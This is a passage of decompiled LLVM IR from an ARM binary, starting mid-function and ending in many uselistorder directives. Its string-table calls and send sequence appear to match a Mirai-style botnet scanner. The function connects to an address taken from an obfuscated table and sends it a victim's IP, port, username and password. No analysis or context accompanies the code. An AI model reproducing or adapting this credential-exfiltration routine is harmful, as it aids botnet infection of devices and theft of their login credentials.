  store i1 %v3_10bfc, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10c0c

dec_label_pc_10c0c:                               ; preds = %dec_label_pc_10c0c.loopexit, %dec_label_pc_10c08
  %v0_10c20 = phi i32 [ %v0_10be0, %dec_label_pc_10c0c.loopexit ], [ 0, %dec_label_pc_10c08 ]
  %v0_10c0c = load i32, i32* @r5, align 4
  %v1_10c0c = add i32 %v0_10c0c, 4
  %v2_10c0c = inttoptr i32 %v1_10c0c to i32*
  %v3_10c0c = load i32, i32* %v2_10c0c, align 4
  %v3_10c10 = udiv i32 %v3_10c0c, 32
  store i32 %v3_10c10, i32* %r2.global-to-local, align 4
  %v1_10c14 = urem i32 %v3_10c0c, 32
  store i32 %v1_10c14, i32* %r1.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_10c18 = mul nuw nsw i32 %v3_10c10, 4
  store i32 %v3_10c18, i32* @ip, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_10c20 = inttoptr i32 %v0_10c0c to i32*
  store i32 %v0_10c20, i32* %v2_10c20, align 4
  %v0_10c24 = load i32, i32* %r3.global-to-local, align 4
  %v1_10c24 = load i32, i32* @r5, align 4
  %v2_10c24 = add i32 %v1_10c24, 24
  %v3_10c24 = inttoptr i32 %v2_10c24 to i32*
  store i32 %v0_10c24, i32* %v3_10c24, align 4
  %v0_ffec.pre = load i32, i32* @ip, align 4
  %v1_fff4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_ffe4

dec_label_pc_10c2c:                               ; preds = %dec_label_pc_10b5c
  %v0_10c2c = load i32, i32* @r5, align 4
  %v1_10c2c = add i32 %v0_10c2c, 4
  %v2_10c2c = inttoptr i32 %v1_10c2c to i32*
  %v3_10c2c = load i32, i32* %v2_10c2c, align 4
  store i32 %v3_10c2c, i32* %r0.global-to-local, align 4
  %v1_10c30 = call i32 @__GI___libc_close(i32 %v3_10c2c)
  store i32 %v1_10c30, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_10c38 = load i32, i32* @r4, align 4
  %v1_10c38 = load i32, i32* @r5, align 4
  %v2_10c38 = add i32 %v1_10c38, 12
  %v3_10c38 = inttoptr i32 %v2_10c38 to i32*
  store i32 %v0_10c38, i32* %v3_10c38, align 4
  %v0_10c3c = load i32, i32* %r3.global-to-local, align 4
  %v1_10c3c = load i32, i32* @r5, align 4
  %v2_10c3c = add i32 %v1_10c3c, 4
  %v3_10c3c = inttoptr i32 %v2_10c3c to i32*
  store i32 %v0_10c3c, i32* %v3_10c3c, align 4
  %v0_10c40 = load i32, i32* @r4, align 4
  %v1_10c40 = trunc i32 %v0_10c40 to i8
  %v2_10c40 = load i32, i32* @r5, align 4
  %v3_10c40 = add i32 %v2_10c40, 284
  %v4_10c40 = inttoptr i32 %v3_10c40 to i8*
  store i8 %v1_10c40, i8* %v4_10c40, align 1
  br label %dec_label_pc_1010c

dec_label_pc_10c48:                               ; preds = %thread-pre-split103
  %v1_10c50 = add i32 %v0_10c50, 12
  %v2_10c50 = inttoptr i32 %v1_10c50 to i32*
  %v3_10c50 = load i32, i32* %v2_10c50, align 4
  store i32 %v3_10c50, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10004.backedge

dec_label_pc_10c58:                               ; preds = %bb425
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_10c64 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_10c64, i32* %r0.global-to-local, align 4
  %v2_10c68 = icmp eq i32 %v3_10c64, -1
  store i1 %v2_10c68, i1* %cpsr_c.global-to-local, align 1
  %v7_10c68 = icmp eq i32 %v3_10c64, -1
  store i1 %v7_10c68, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_10c64, i32* @r4, align 4
  br i1 %v7_10c68, label %dec_label_pc_10db4, label %dec_label_pc_10c74

dec_label_pc_10c74:                               ; preds = %dec_label_pc_10c58
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_10c78 = call i32 @table_unlock_val(i32 4)
  store i32 2032805430, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i16** @global_var_260c0.116 to i32), i32* %r3.global-to-local, align 4
  %v0_10c84 = load i32, i32* @r6, align 4
  store i32 %v0_10c84, i32* %r1.global-to-local, align 4
  store i32 2032805430, i32* @global_var_260c4.118, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v2_10c90 = inttoptr i32 %v0_10c84 to i32*
  %v3_10c90 = call i32 @table_retrieve_val(i32 4, i32* %v2_10c90)
  store i32 %v2_10a78, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_10ca4 = call i32 @table_lock_val(i32 4)
  %v0_10ca8 = load i32, i32* @r4, align 4
  store i32 %v0_10ca8, i32* %r0.global-to-local, align 4
  store i32 %v2_10a78, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_10cb4 = call i32 @__libc_connect(i32 %v0_10ca8, i32 %v2_10a78, i32 16)
  store i32 %v3_10cb4, i32* %r0.global-to-local, align 4
  %v3_10cb8 = icmp eq i32 %v3_10cb4, -1
  store i1 %v3_10cb8, i1* %cpsr_c.global-to-local, align 1
  %v8_10cb8 = icmp eq i32 %v3_10cb4, -1
  store i1 %v8_10cb8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_10cb8, label %dec_label_pc_10cc0, label %dec_label_pc_10d10

dec_label_pc_10cc0:                               ; preds = %dec_label_pc_10c74
  %v0_10cc0 = load i32, i32* @r4, align 4
  store i32 %v0_10cc0, i32* %r0.global-to-local, align 4
  %v1_10cc4 = call i32 @__GI___libc_close(i32 %v0_10cc0)
  %v0_10cc8 = load i32, i32* @r6, align 4
  store i32 %v0_10cc8, i32* %r0.global-to-local, align 4
  %v1_10ccc = call i32 @__GI_exit(i32 %v0_10cc8)
  store i32 %v1_10ccc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10cd0

dec_label_pc_10cd0:                               ; preds = %dec_label_pc_100b8, %dec_label_pc_10cc0
  store i32 104, i32* %r3.global-to-local, align 4
  %v1_10cd4 = load i32, i32* @sb, align 4
  %v2_10cd4 = inttoptr i32 %v1_10cd4 to i32*
  store i32 104, i32* %v2_10cd4, align 4
  br label %dec_label_pc_100d0

dec_label_pc_10cdc:                               ; preds = %dec_label_pc_fe58
  store i32 %v3_10cdc, i32* %r0.global-to-local, align 4
  %v3_10ce4 = udiv i32 %v3_10cdc, 32
  %v3_10ce8 = mul nuw nsw i32 %v3_10ce4, 4
  store i32 %v2_10cec, i32* @lr, align 4
  %v2_10cf0 = add i32 %v3_10ce8, %v2_10cec
  store i32 %v2_10cf0, i32* %r3.global-to-local, align 4
  %v1_10cf4 = add i32 %v2_10cf0, -312
  %v2_10cf4 = inttoptr i32 %v1_10cf4 to i32*
  %v3_10cf4 = load i32, i32* %v2_10cf4, align 4
  %v1_10cf8 = urem i32 %v3_10cdc, 32
  store i32 %v1_10cf8, i32* %r1.global-to-local, align 4
  %v7_10cfc = shl i32 1, %v1_10cf8
  %v8_10cfc = or i32 %v3_10cf4, %v7_10cfc
  store i32 %v8_10cfc, i32* %r2.global-to-local, align 4
  %v0_10d00 = load i32, i32* @r5, align 4
  %v3_10d00 = icmp uge i32 %v0_10d00, %v3_10cdc
  store i1 %v3_10d00, i1* %cpsr_c.global-to-local, align 1
  %v9_10d00 = icmp eq i32 %v0_10d00, %v3_10cdc
  store i1 %v9_10d00, i1* %cpsr_z.global-to-local, align 1
  %v5_10d04 = icmp slt i32 %v0_10d00, %v3_10cdc
  br i1 %v5_10d04, label %bb427, label %bb428

bb427:                                            ; preds = %dec_label_pc_10cdc
  store i32 %v3_10cdc, i32* @r5, align 4
  br label %bb428

bb428:                                            ; preds = %dec_label_pc_10cdc, %bb427
  store i32 %v8_10cfc, i32* %v2_10cf4, align 4
  br label %bb378

dec_label_pc_10d10:                               ; preds = %dec_label_pc_10c74
  store i32 %v2_10750, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10d20 = load i32, i32* @r4, align 4
  store i32 %v0_10d20, i32* %r0.global-to-local, align 4
  %v0_10d24 = load i32, i32* @r6, align 4
  %v6_10d24 = trunc i32 %v0_10d24 to i8
  store i8 %v6_10d24, i8* %stack_var_-56, align 1
  %v6_10d28 = call i32 @__libc_send(i32 %v0_10d20, i32 %v2_10750, i32 1, i32 16384)
  store i32 %v2_1073c, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10d3c = load i32, i32* @r4, align 4
  store i32 %v0_10d3c, i32* %r0.global-to-local, align 4
  %v4_10d40 = call i32 @__libc_send(i32 %v0_10d3c, i32 %v2_1073c, i32 4, i32 16384)
  %v2_10d48 = ptrtoint i32* %stack_var_-42 to i32
  store i32 %v2_10d48, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10d54 = load i32, i32* @r4, align 4
  store i32 %v0_10d54, i32* %r0.global-to-local, align 4
  %v4_10d58 = call i32 @__libc_send(i32 %v0_10d54, i32 %v2_10d48, i32 2, i32 16384)
  %v0_10d5c = load i32, i32* @r8, align 4
  %v1_10d5c = add i32 %v0_10d5c, 12
  store i32 %v1_10d5c, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10d68 = load i32, i32* @r4, align 4
  store i32 %v0_10d68, i32* %r0.global-to-local, align 4
  %v4_10d6c = call i32 @__libc_send(i32 %v0_10d68, i32 %v1_10d5c, i32 1, i32 16384)
  store i32 %v4_10d6c, i32* %r0.global-to-local, align 4
  %v0_10d70 = load i32, i32* @r8, align 4
  %v1_10d70 = inttoptr i32 %v0_10d70 to i32*
  %v2_10d70 = load i32, i32* %v1_10d70, align 4
  store i32 %v2_10d70, i32* %r1.global-to-local, align 4
  %v1_10d74 = add i32 %v0_10d70, 12
  %v2_10d74 = inttoptr i32 %v1_10d74 to i8*
  %v3_10d74 = load i8, i8* %v2_10d74, align 1
  %v4_10d74 = zext i8 %v3_10d74 to i32
  store i32 %v4_10d74, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10d7c = load i32, i32* @r4, align 4
  store i32 %v0_10d7c, i32* %r0.global-to-local, align 4
  %v4_10d80 = call i32 @__libc_send(i32 %v0_10d7c, i32 %v2_10d70, i32 %v4_10d74, i32 16384)
  %v0_10d84 = load i32, i32* @r8, align 4
  %v1_10d84 = add i32 %v0_10d84, 13
  store i32 %v1_10d84, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10d90 = load i32, i32* @r4, align 4
  store i32 %v0_10d90, i32* %r0.global-to-local, align 4
  %v4_10d94 = call i32 @__libc_send(i32 %v0_10d90, i32 %v1_10d84, i32 1, i32 16384)
  %v0_10d98 = load i32, i32* @r4, align 4
  store i32 %v0_10d98, i32* %r0.global-to-local, align 4
  %v0_10d9c = load i32, i32* @r8, align 4
  %v1_10d9c = add i32 %v0_10d9c, 13
  %v2_10d9c = inttoptr i32 %v1_10d9c to i8*
  %v3_10d9c = load i8, i8* %v2_10d9c, align 1
  %v4_10d9c = zext i8 %v3_10d9c to i32
  store i32 %v4_10d9c, i32* %r2.global-to-local, align 4
  %v1_10da0 = add i32 %v0_10d9c, 4
  %v2_10da0 = inttoptr i32 %v1_10da0 to i32*
  %v3_10da0 = load i32, i32* %v2_10da0, align 4
  store i32 %v3_10da0, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_10da8 = call i32 @__libc_send(i32 %v0_10d98, i32 %v3_10da0, i32 %v4_10d9c, i32 16384)
  %v0_10dac = load i32, i32* @r4, align 4
  store i32 %v0_10dac, i32* %r0.global-to-local, align 4
  %v1_10db0 = call i32 @__GI___libc_close(i32 %v0_10dac)
  store i32 %v1_10db0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10db4

dec_label_pc_10db4:                               ; preds = %dec_label_pc_10c58, %dec_label_pc_10d10
  %v0_10db4 = load i32, i32* @r6, align 4
  store i32 %v0_10db4, i32* %r0.global-to-local, align 4
  %v1_10db8 = call i32 @__GI_exit(i32 %v0_10db4)
  store i32 %v1_10db8, i32* %r0.global-to-local, align 4
  ret i32 %v1_10db8

; uselistorder directives
  uselistorder i32 %v0_10d00, { 0, 2, 1 }
  uselistorder i32 %v1_10cf8, { 1, 0 }
  uselistorder i1 %v7_10c68, { 1, 0 }
  uselistorder i32 %v3_10c64, { 1, 0, 2, 3 }
  uselistorder i32 %v3_10c50, { 1, 0 }
  uselistorder i32 %v3_10c0c, { 1, 0 }
  uselistorder i1 %v3_10bfc, { 1, 0 }
  uselistorder i32 %v0_10be0, { 0, 2, 4, 3, 1 }
  uselistorder i32 %v3_10bac, { 2, 1, 0, 3 }
  uselistorder i32 %v3_10ba8, { 1, 0 }
  uselistorder i32 %v0_10ba0, { 1, 0 }
  uselistorder i32 %v4_10b30, { 1, 0, 2 }
  uselistorder i32 %v3_10adc, { 1, 0 }
  uselistorder i1 %v2_10aa4, { 1, 0 }
  uselistorder i32 %.432, { 1, 0 }
  uselistorder i1 %v7_10a8c, { 1, 0 }
  uselistorder i32 %v0_10a88, { 2, 1, 0, 3 }
  uselistorder i1 %v7_10a60, { 1, 0 }
  uselistorder i32 %v0_10a60, { 2, 1, 0, 3 }
  uselistorder i32 %v0_109e4, { 1, 0 }
  uselistorder i32 %v0_109c8.pr, { 1, 0 }
  uselistorder i32 %v0_10994, { 1, 2, 0 }
  uselistorder i32 %v0_10958, { 1, 0 }
  uselistorder i32 %v1_10950, { 1, 0 }
  uselistorder i32 %v1_10948, { 0, 2, 3, 4, 5, 1 }
  uselistorder i32 %v3_10944, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v0_10944, { 0, 2, 1 }
  uselistorder i32 %v0_10924.pr, { 1, 0 }
  uselistorder i32 %v0_10904.pr, { 1, 0 }
  uselistorder i1 %v7_108dc, { 1, 0 }
  uselistorder i1 %v2_108cc, { 1, 0, 2 }
  uselistorder i1 %v2_108b0, { 1, 0, 2 }
  uselistorder i32 %v1_108d0, { 1, 2, 3, 0 }
  uselistorder i32 %v1_108a4, { 4, 2, 1, 3, 0 }
  uselistorder i32 %v2_108d4, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 %v0_10858, { 1, 0 }
  uselistorder i32 %v0_10c50, { 1, 0, 2 }
  uselistorder i1 %v0_10848, { 1, 0 }
  uselistorder i32 %v4_1083c, { 1, 0, 2 }
  uselistorder i32 %v1_10808, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_10808, { 0, 2, 1 }
  uselistorder i32 %v0_10800, { 1, 0 }
  uselistorder i1 %v7_107fc, { 1, 0 }
  uselistorder i1 %v7_107f4, { 1, 0 }
  uselistorder i1 %v8_107ec, { 1, 0 }
  uselistorder i1 %v7_107d0, { 1, 0 }
  uselistorder i1 %v7_107c8, { 1, 0 }
  uselistorder i1 %v8_107c0, { 1, 0 }
  uselistorder i32 %v1_107a8, { 1, 2, 3, 4, 5, 0, 6, 7, 8 }
  uselistorder i1 %v7_10778, { 1, 0 }
  uselistorder i32 %v1_10720, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_10720, { 0, 2, 1 }
  uselistorder i32 %v0_10718, { 1, 0 }
  uselistorder i1 %v7_10714, { 1, 0 }
  uselistorder i1 %v7_1070c, { 1, 0 }
  uselistorder i1 %v7_10704, { 1, 0 }
  uselistorder i1 %v8_106fc, { 1, 0 }
  uselistorder i1 %v7_106e0, { 1, 0 }
  uselistorder i1 %v7_106d8, { 1, 0 }
  uselistorder i1 %v7_106d0, { 1, 0 }
  uselistorder i1 %v8_106c8, { 1, 0 }
  uselistorder i32 %v1_106b0, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i1 %v8_1064c, { 1, 0 }
  uselistorder i8 %v3_10644, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_1063c, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_1063c, { 0, 2, 1 }
  uselistorder i32 %v0_10634, { 1, 0 }
  uselistorder i1 %v7_10630, { 1, 0 }
  uselistorder i1 %v7_10628, { 1, 0 }
  uselistorder i1 %v7_10620, { 1, 0 }
  uselistorder i1 %v7_1054c, { 1, 0 }
  uselistorder i1 %v7_10544, { 1, 0 }
  uselistorder i1 %v7_1053c, { 1, 0 }
  uselistorder i1 %v8_10534, { 1, 0 }
  uselistorder i32 %v1_1051c, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i1 %v8_104b8, { 1, 0 }
  uselistorder i8 %v3_104b0, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_104a8, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_104a8, { 0, 2, 1 }
  uselistorder i32 %v0_104a0, { 1, 0 }
  uselistorder i1 %v7_1049c, { 1, 0 }
  uselistorder i1 %v7_10494, { 1, 0 }
  uselistorder i1 %v7_1048c, { 1, 0 }
  uselistorder i1 %v7_10478, { 1, 0 }
  uselistorder i1 %v7_10470, { 1, 0 }
  uselistorder i1 %v7_10468, { 1, 0 }
  uselistorder i1 %v8_10460, { 1, 0 }
  uselistorder i32 %v1_10448, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i1 %v8_103e4, { 1, 0 }
  uselistorder i8 %v3_103dc, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_103d4, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_103d4, { 0, 2, 1 }
  uselistorder i32 %v0_103cc, { 1, 0 }
  uselistorder i1 %v7_103c8, { 1, 0 }
  uselistorder i1 %v7_103c0, { 1, 0 }
  uselistorder i1 %v7_103b8, { 1, 0 }
  uselistorder i1 %v7_103a4, { 1, 0 }
  uselistorder i1 %v7_1039c, { 1, 0 }
  uselistorder i1 %v7_10394, { 1, 0 }
  uselistorder i1 %v8_1038c, { 1, 0 }
  uselistorder i32 %v1_10374, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i1 %v8_10310, { 1, 0 }
  uselistorder i8 %v3_10308, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_10300, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_10300, { 0, 2, 1 }
  uselistorder i32 %v0_102f8, { 1, 0 }
  uselistorder i1 %v7_102f4, { 1, 0 }
  uselistorder i1 %v7_102ec, { 1, 0 }
  uselistorder i1 %v7_102e4, { 1, 0 }
  uselistorder i1 %v7_102d0, { 1, 0 }
  uselistorder i1 %v7_102c8, { 1, 0 }
  uselistorder i1 %v7_102c0, { 1, 0 }
  uselistorder i1 %v8_102b8, { 1, 0 }
  uselistorder i32 %v1_102a0, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i1 %v8_1023c, { 1, 0 }
  uselistorder i8 %v3_10234, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_1022c, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_1022c, { 0, 2, 1 }
  uselistorder i32 %v0_10224, { 1, 0 }
  uselistorder i1 %v7_10220, { 1, 0 }
  uselistorder i1 %v7_10218, { 1, 0 }
  uselistorder i1 %v7_10210, { 1, 0 }
  uselistorder i1 %v7_101fc, { 1, 0 }
  uselistorder i1 %v7_101f4, { 1, 0 }
  uselistorder i1 %v7_101ec, { 1, 0 }
  uselistorder i1 %v8_101e4, { 1, 0 }
  uselistorder i32 %v1_101cc, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i32 %v0_101b8, { 1, 2, 0 }
  uselistorder i32 %v2_101a4, { 1, 0 }
  uselistorder i32 %v0_101a4, { 2, 4, 0, 1, 3, 5 }
  uselistorder i32 %v3_101a0, { 2, 1, 4, 0, 5, 3 }
  uselistorder i32 %v1_10178, { 2, 1, 0 }
  uselistorder i1 %v7_10154, { 1, 0 }
  uselistorder i32 %v4_10150, { 1, 0, 2 }
  uselistorder i32 %v1_10110, { 0, 2, 3, 4, 1 }
  uselistorder i1 %v1_100ec, { 1, 0 }
  uselistorder i32 %v1_100e0, { 2, 1, 0 }
  uselistorder i32 %v1_100dc, { 1, 0 }
  uselistorder i32 %v0_10080, { 2, 21, 4, 3, 20, 19, 5, 6, 23, 7, 8, 22, 9, 10, 24, 11, 12, 27, 13, 14, 25, 15, 16, 26, 17, 18, 28, 29, 1, 0 }
  uselistorder i32 %v1_1005c, { 1, 2, 3, 0 }
  uselistorder i32 %v3_10058, { 1, 0 }
  uselistorder i32 %v4_1003c, { 0, 4, 1, 2, 3, 5, 6, 7 }
  uselistorder i32 %v2_10028, { 1, 0, 2 }
  uselistorder i32 %v3_10024, { 1, 0, 2 }
  uselistorder i32 %v0_10aec, { 1, 0, 2 }
  uselistorder i32 %v3_fff0, { 1, 0 }
  uselistorder i32 %v1_ffd4, { 3, 2, 1, 0 }
  uselistorder i32 %v3_ffd0, { 1, 0 }
  uselistorder i32 %v3_ffc8, { 1, 2, 0 }
  uselistorder i1 %v7_ffb4, { 1, 0 }
  uselistorder i32 %v3_ffb0, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32 %v0_ffa4, { 1, 0 }
  uselistorder i32 %v2_10a78, { 1, 0, 2, 3 }
  uselistorder i32* %v2_10758, { 1, 2, 3, 0 }
  uselistorder i32 %v2_10750, { 4, 5, 1, 0, 3, 6, 7, 2 }
  uselistorder i32 %v2_1073c, { 1, 0, 3, 2, 9, 8, 5, 7, 6, 4 }
  uselistorder i32 %v2_10988, { 1, 0 }
  uselistorder i32 %v1_ff54, { 0, 1, 3, 2 }
  uselistorder i32 %v0_ff54, { 0, 1, 3, 2 }
  uselistorder i32 %v1_ff20, { 2, 1, 0 }
  uselistorder i32 %v1_ff1c, { 1, 0 }
  uselistorder i1 %v2_fefc, { 1, 0, 2 }
  uselistorder i32 %v0_fef8, { 1, 0, 2 }
  uselistorder i1 %v7_fec4, { 0, 3, 4, 1, 2 }
  uselistorder i1 %v2_fec4, { 1, 0, 2 }
  uselistorder i32 %v2_febc, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v2_feb0, { 1, 0, 2 }
  uselistorder i32 %v0_feb4, { 1, 0 }
  uselistorder i32 %v1_fe98, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_fe8c, { 0, 1, 3, 2 }
  uselistorder i32 %v0_fe8c, { 0, 2, 1 }
  uselistorder i32 %v1_fe7c, { 1, 0 }
  uselistorder i32 %v3_10cdc, { 4, 7, 5, 6, 1, 0, 9, 3, 2, 8 }
  uselistorder i32 %v2_10cec, { 0, 7, 1, 5, 2, 4, 3, 6 }
  uselistorder i32 %v1_fdcc, { 1, 0 }
  uselistorder i32 %v1_fdb4, { 0, 2, 3, 1 }
  uselistorder i32 %v0_fdc0, { 0, 3, 2, 1 }
  uselistorder i32 %v0_fd70, { 2, 3, 4, 1, 0, 5, 7, 6 }
  uselistorder i32 %v5_fd64, { 2, 1, 0 }
  uselistorder i32 %v1_fd44, { 2, 0, 1, 3, 4 }
  uselistorder i1 %v2_fd20, { 1, 0 }
  uselistorder i1 %v9_fcec, { 1, 0 }
  uselistorder i32 %v0_fc9c, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_fc40, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_fbf0, { 1, 0 }
  uselistorder i32 %v5_fb88, { 1, 0 }
  uselistorder i1 %v2_fad0, { 1, 0 }
  uselistorder i1 %v3_fab4, { 1, 0, 2 }
  uselistorder i1 %v2_faa0, { 1, 0 }
  uselistorder i1 %v2_fa7c, { 1, 0 }
  uselistorder i32 %v1_fa2c, { 14, 13, 12, 11, 15, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_fa18, { 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 20, 21, 22, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 6, 7, 8, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_fa14, { 4, 5, 6, 7, 0, 8, 1, 2, 3, 9 }
  uselistorder i32 %v0_f9fc, { 1, 0 }
  uselistorder i32 %v0_f9d4, { 1, 0 }
  uselistorder i32 %stack_var_-1880.0, { 0, 1, 2, 3, 4, 5, 7, 9, 12, 11, 6, 8, 10, 14, 13 }
  uselistorder i16 %v5_f70c.le, { 0, 2, 1 }
  uselistorder i32 %v0_f6f0, { 3, 2, 0, 1 }
  uselistorder i1 %v7_f690, { 1, 0 }
  uselistorder i32 %v3_f688, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32 %v0_f674, { 1, 0 }
  uselistorder i32 %v0_f644, { 1, 0 }
  uselistorder i32 %storemerge308, { 1, 0 }
  uselistorder i32 %v0_f5b8, { 1, 2, 3, 0, 4 }
  uselistorder i16* %stack_var_-52, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 1, 0, 2 }
  uselistorder i32* %stack_var_-96, { 2, 0, 1, 3 }
  uselistorder i32* %stack_var_-68, { 1, 0 }
  uselistorder i32* %stack_var_-224, { 1, 0 }
  uselistorder i32* %stack_var_-352, { 1, 0 }
  uselistorder i8* %stack_var_-56, { 8, 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32* %stack_var_-60, { 6, 7, 8, 0, 9, 1, 10, 4, 11, 2, 12, 3, 13, 5, 14 }
  uselistorder i32* %stack_var_-42, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 60, 61, 62, 63, 64, 65, 66, 71, 72, 67, 73, 74, 75, 76, 77, 79, 78, 80, 81, 82, 83, 21, 84, 152, 68, 69, 22, 23, 24, 153, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 70, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 108, 109, 111, 110, 107, 112, 154, 155, 113, 114, 156, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 157, 131, 132, 133, 134, 136, 135, 138, 137, 151, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150 }
  uselistorder i32* %r2.global-to-local, { 35, 36, 37, 38, 39, 40, 41, 49, 42, 43, 44, 50, 51, 52, 53, 9, 127, 45, 46, 10, 11, 0, 1, 2, 3, 4, 5, 6, 7, 8, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 47, 48, 130, 131, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 128, 129, 66, 67, 69, 68, 65, 132, 70, 133, 71, 134, 135, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 90, 89, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126 }
  uselistorder i32* %r1.global-to-local, { 36, 37, 38, 39, 40, 41, 42, 52, 43, 44, 45, 46, 53, 54, 55, 5, 113, 114, 47, 48, 6, 7, 51, 0, 1, 2, 3, 4, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 116, 117, 49, 50, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 115, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112 }
